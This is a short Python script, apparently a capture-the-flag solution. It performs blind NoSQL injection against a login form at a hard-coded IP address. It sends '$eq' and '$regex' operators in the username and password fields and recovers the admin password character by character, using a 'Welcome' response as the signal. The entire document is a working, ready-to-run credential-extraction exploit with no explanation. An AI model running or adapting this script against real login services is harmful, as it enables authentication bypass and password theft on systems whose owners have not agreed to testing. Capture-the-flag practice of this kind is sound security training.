import requests
import string

URL = "http://103.167.136.89:10002/"
username = "admin"
password = "ForestyHC{"

while True:
    for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "_" + "}":
        if c not in ['*','+','.','?','|']:
            payload = {"username[$eq]": username, "password[$regex]": password + c + ".*"}
            r = requests.post(URL, data=payload, allow_redirects=True)
            if "Welcome" in r.text:
                if c == "}":
                    print("FLAG: " + password + c)
                    exit(0)
                password += c
                print(password)
                break